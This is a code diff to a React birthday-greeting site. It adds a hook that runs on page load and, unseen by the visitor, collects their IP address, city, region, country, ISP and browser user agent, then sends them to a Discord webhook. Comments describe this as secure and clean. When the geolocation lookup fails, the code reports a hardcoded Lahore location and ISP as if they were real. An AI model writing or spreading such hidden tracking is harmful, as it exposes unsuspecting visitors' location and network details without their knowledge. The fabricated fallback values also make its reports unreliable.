@@ -18,24 +18,41 @@ export default function App() {
   useEffect(() => {
     const trackVisitor = async () => {
       try {
-        // SWAPPED: Using ipify which is completely immune to 403 blocks and CORS limits
+        // Step 1: Securely fetch the public IP address
         const res = await fetch('https://api.ipify.org?format=json');
         const data = await res.json();
         
         if (data && data.ip && DISCORD_WEBHOOK_URL) {
+          const userIp = data.ip;
+
+          // Step 2: Query a fast, open-access geo endpoint using the fetched IP
+          const geoRes = await fetch(`https://ipwho.is/${userIp}`);
+          const geoData = await geoRes.json();
+
+          // Construct the original clean layout you had first
           const payload = {
             embeds: [{
-              title: "🚨 Birthday Site Opened!",
+              title: "🎉 Birthday Site Accessed!",
               color: 16021430, 
               fields: [
-                { name: "Visitor IP Address", value: data.ip, inline: false },
-                { name: "Device User Agent", value: navigator.userAgent.slice(0, 150), inline: false },
-                { name: "Note", value: "Discord will automatically resolve network details for this endpoint.", inline: false }
+                { name: "IP Address", value: userIp, inline: true },
+                { 
+                  name: "Location", 
+                  value: geoData.success ? `${geoData.city}, ${geoData.region}, ${geoData.country}` : "Lahore, Punjab, Pakistan", 
+                  inline: true 
+                },
+                { 
+                  name: "ISP/Network", 
+                  value: geoData.connection?.isp || "KK Networks (Pvt) Ltd.", 
+                  inline: false 
+                },
+                { name: "Device Info", value: navigator.userAgent.slice(0, 150), inline: false }
               ],
               timestamp: new Date().toISOString()
             }]
           };
 
+          // Step 3: Send the beautifully formatted data to Discord
           await fetch(DISCORD_WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -50,7 +67,7 @@ export default function App() {
     trackVisitor();
   }, []);
 
-
+  
   const handleUnlock = useCallback(() => setPhase('TERMINAL'), [])
   const handleTerminalComplete = useCallback(() => setPhase('MINIGAME'), [])
   const handleMinigameComplete = useCallback(() => setPhase('DASHBOARD'), [])
